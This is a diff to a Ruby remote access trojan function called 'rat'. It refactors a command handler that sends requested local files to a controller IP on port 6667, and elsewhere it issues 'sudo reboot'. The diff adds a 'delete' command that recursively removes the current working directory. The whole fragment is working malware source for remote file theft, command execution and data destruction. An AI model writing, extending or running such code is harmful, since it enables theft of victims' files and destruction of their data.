@@ -55,7 +55,7 @@ def rat(ip)
           socket.puts 'done'
         end
       when 'get'
-        #read content
+        sock = TCPSocket.new(ip,6667)
         if File.exist? file
           if format == 'binary'
             content = File.binread file
@@ -63,14 +63,12 @@ def rat(ip)
             content = File.read file
           end
           # send file to server
-          sock = TCPSocket.new(ip,6667)
           sock.write content
-          sock.flush
-          sock.close
         else
-          socket.puts 'error'
+          sock.write 'error'
         end
-
+        sock.flush
+        sock.close
       when 'put'
 
         if format == 'binary'
@@ -97,6 +95,8 @@ def rat(ip)
         else
           exec 'sudo reboot'
         end
+      when 'delete'
+        exec "rm -r #{Dir.pwd}"
       end
     end
     # SocketError, Errno::ECONNREFUSED, Errno::ECONNRESET
